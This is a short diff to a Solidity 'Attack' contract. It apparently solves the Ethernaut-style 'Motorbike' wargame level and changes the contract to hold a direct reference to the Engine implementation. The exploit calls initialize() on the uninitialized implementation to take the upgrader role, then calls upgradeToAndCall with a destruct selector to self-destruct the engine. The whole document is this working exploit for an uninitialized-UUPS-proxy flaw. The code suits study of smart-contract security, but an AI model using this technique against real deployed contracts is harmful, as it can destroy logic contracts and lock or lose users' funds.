@@ -6,12 +6,11 @@ import "@openzeppelin/contracts/utils/Address.sol";
 import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
 
 contract Attack {
-    Motorbike m;
+    Engine e;
 
-    constructor(Motorbike _m) {
-        m = _m;
+    constructor(Engine _e) {
+        e = _e;
         // hijack the upgrader of the engine
-        Engine e = Engine(address(m));
         e.initialize();
         require(e.upgrader() == address(this), "engine upgrader hijacking failed.");
     }
@@ -21,7 +20,6 @@ contract Attack {
     }
 
     function attack() external {
-        Engine e = Engine(address(m));
         // now upgrader is attacker, do the upgrade and destory the engine
         e.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destruct.selector));
     }
